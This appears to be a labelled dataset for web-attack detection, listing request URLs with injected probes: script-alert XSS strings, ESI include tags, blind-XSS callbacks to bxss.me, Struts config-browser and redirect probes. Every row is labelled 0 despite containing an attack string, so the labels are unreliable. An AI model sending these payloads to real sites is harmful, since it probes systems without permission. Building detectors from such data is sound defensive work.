sentences	labels
/aux&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/jsearchfront&http:&&bxss.me&t&fit.txt?.jpg/****/website.js 	 0
/en&aboutus&messagefromchairman&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztzl&xxxsd&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ldzc&bysrd&201610&t20161016_531.html?leader=—¶œ„¡·<esi:include src=""http://*******/rpb.png""/> 	 0
/xxgk&zfwjn&1088&1105&list.html?new=0.4577770013510203<esi:include src=""http://*******/rpb.png""/> 	 0
/xwzx&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/***/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 0
/wzdt&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/gjcp&gcjx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/gygj&dependencies&index?search="">alert(/***/) 	 0
/xwzx&jtdt&jt17&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/gygj&ssgs&clgf&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/dcwj&mswpmm&common&signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 0
/gygj&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/jsearchfront&recommend&census.do?redirectaction:http://**************/ 	 0
/xxgk&zzxxgk&tjj&zfxxgkml_2127&lzyj&list.html?new=bxss.me/*/xss.html? 	 0
/ldzc&byszf&http:&&bxss.me&t&fit.txt?.jpg/******/t20210806_185416.html 	 0
/ztzl&yqzt&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ywly&gccb&xnygc&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ztzl&bwcx&dtbb&jtdt&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/xxgk&zfwjn&1088&1089&list.html?new=bxss.me/*/xss.html? 	 0
/es&mswpmm&common&signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 0
/bhzx&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/cgi-bin&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/xwzx&bmkx&http:&&bxss.me&t&fit.txt?.jpg/******/t20181208_112298.html 	 0
/ywly&gccb&jtysgc&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/nbfw&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/com1&api&sources?resource=alert(/***/)&format=txt 	 0
/js&reviews&index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/***/)&false_positives=without&sort=&asc=false&commit=search 	 0
/xwzx&rwfc&202107&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/ru&mswpmm&common&signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
/jsearchfront&http:&&bxss.me&t&fit.txt?.jpg/****/110105008056111/16/images/jquery.waterfall.js 	 0
/ztzl&yqzt&bsap&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/en&sustainability&csrreports&201908&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/gjcp&&screens&switch&switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/******/logo-mobility-controller.gif onload=alert(777)> 	 0
/lxwm&mswpmm&common&signin.aspx?tbemailaddress=alert(777)returnurl=/******/common/default.aspx 	 0
/xxgk&http:&&bxss.me&t&fit.txt?.jpg/****/list.html 	 0
/jsearchfront&categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &ranksign=1&searchid=1&total=bxss.me/*/xss.html? 	 0
/com1&wp-admin&admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 0
/ztpd&system&count&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
/inc&dependencies&index?search="">alert(/***/) 	 0
/qtyz&mswpmm&common&signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
/xxgk&zfwjn&1088&1101&list.html?new=0.5927188119755153<esi:include src=""http://*******/rpb.png""/> 	 0
/jsearchfront&template&jcse&http:&&bxss.me&t&fit.txt?.jpg/**/images/ui.css 	 0
/nul&mswpmm&common&signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 0
/ztzl&dependencies&index?search="">alert(/***/) 	 0
/jsearchfront&recommend&career.do?redirectaction:http://**************/ 	 0
/ztzl&gjdjbn&djbn_zyjh&config-browser&showconfig.action?namespace=<script>alert(/***/);</script>&actionname=showcase 	 0
